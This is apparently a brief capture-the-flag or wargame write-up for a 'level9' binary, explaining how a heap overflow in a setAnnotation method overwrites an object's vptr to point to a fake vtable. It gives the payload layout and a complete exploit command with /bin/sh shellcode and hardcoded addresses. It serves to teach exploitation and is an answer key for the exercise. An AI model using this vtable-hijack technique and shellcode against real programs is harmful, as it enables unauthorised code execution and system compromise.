See [asm_analysis.md](Ressources/asm_analysis.md) for the complete ASM analysis.

The asm analysis shows us that we can use a heap overflow in the setAnnonation method to override the vptr of object2 from object1

Since the main() function calls for vtable[0] for object2 , if we replace its vptr by a value of our own it will point to a fake vtable.

We make this fake vtable contain the address of our shellcode, instead of a pointer to the first method.

Our payload is built like this :

    |               108 bytes              |
        4 bytes         26 bytes   78 bytes  (+4 bytes)
[address of shellcode] [shellcode] [padding]   [fake vptr]


./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80" + "A" * 78 + "\x0c\xa0\04\x08"')

